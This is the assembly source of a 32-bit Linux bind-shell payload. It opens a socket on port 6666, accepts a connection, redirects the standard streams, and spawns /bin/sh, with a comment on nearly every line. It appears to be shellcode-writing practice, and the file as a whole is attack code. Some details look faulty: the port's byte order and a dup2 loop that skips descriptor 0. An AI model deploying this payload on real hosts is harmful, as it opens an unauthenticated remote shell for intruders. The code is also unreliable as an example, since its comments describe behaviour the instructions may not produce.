global _start
section .text
_start:


	;socket(int domain,int type,int protocol)
	xor ebx, ebx		; zero out EBX
	xor ecx, ecx		; zero out ECX
	mul ecx			; zero out EAX

	mov al, 102 		; put 102 socketcall syscall in EAX
	mov bl, 1		; put 1 = socket in EBX
	push ecx		; put 0x00 terminator on the stack
	push byte 6		; put 6 = protocol on the stack
	push byte 1		; put 1 = type on the stack
	push byte 2		; put 2 = domain on the stack
	mov ecx, esp 		; put address of the arguments from stack in ECX
	int 0x80		; execute syscall socketcall

	mov edi, eax		; save socketfd in EDI

	;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	xor eax, eax		; zero out EAX
	mov al, 102		; put 102 socketcall syscall in EAX
	pop ebx			; get 2 from the stack and put it in EBX
	xor ecx, ecx		; zero out ECX
	push ecx		; put 0x00 terminator on the stack
	push word 6666		; push sa_data (protnr) = 6666 on the stack
	push ebx 		; push sa_family = PF_INET = 2 on the stack
	xor esi, esi		; zero out ESI
	mov esi, esp		; put address of the struct sockaddr in ESI
	push byte 16		; put addrlen of struct 16 = 2 * 8bytes on the stack
	push esi		; put address of the struct sockaddr on the stack
	push edi		; put address of the socketfd on the stack
	mov ecx, esp		; put address of all the arguments for the bind function in ECX
	int 0x80		; execute syscall socketcall

	;int listen(int sockfd, int backlog)
	xor eax, eax		; zero out EAX
	mov al, 102 		; put 102 socketcall syscall in EAX
	add ebx, 2		; add 2 to EBX, listen = 4
	push byte 1		; put 1 on the stack
	push edi		; put address of the socketfd on the stack
	mov ecx, esp		; put address of all the arguments for the listen function in ECX
	int 0x80		; execute syscall socketcall

	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	xor eax, eax		; zero out EAX
	mov al, 102		; put 102 socketcall syscall in EAX
	inc ebx			; increment EBX with 1, accept = 5
	xor ecx, ecx		; zero out ECX
	push ecx		; put NULL on the stack
	push ecx		; put NULL on the stack
	push edi		; put address of the socketfd on the stack
	mov ecx, esp		; put address of all the arguments for the accept function in ECX
	int 0x80		; exexute syscall socketcall

	xor ebx, ebx		; zero out EBX
	mov ebx, eax		; put the address of the new socketfd in EBX

	xor ecx, ecx		; zero out ECX
	mov cl, 2		; put 2 (STDIN, STOUT, STERR) in ECX
	xor eax, eax		; zero out EAX

dup2_loop:
	
	;int dup2(int oldfd, int newfd)
	mov al, 63		; put 63 dup2 syscall in EAX
	int 0x80		; execute syscall dup2
	dec ecx			; decrement ecx with 1
	jnz dup2_loop		; jump to dup2_loop as long as ECX is not 0, zero flag is set


	;int execve(const char *filename, char *const argv[], char *const envp[])
	xor eax, eax		; zero out EAX	
	mov al, 0xb		; put 11 execve syscall in EAX
	xor ebx, ebx		; zero out EBX
	push ebx		; put 0x00 string terminator on the stack
	push 0x68732f2f		; put hs// as string on the stack 
	push 0x6e69622f		; put nib/ as string on the stack
	mov ebx, esp		; put address of the string /bin/sh in ECX
	xor ecx, ecx		; zero out ECX
	push ecx		; put NULL on the stack
	push ecx		; put NULL on the stack
	mov ecx, esp		; put address of both NULL from the stack in ECX
	xor edx, edx		; zero out EDX
	push edx		; put NULL on the stack
	mov edx, esp		; put address of NULL from the stack in EDX
	int 0x80		; execute syscall execve
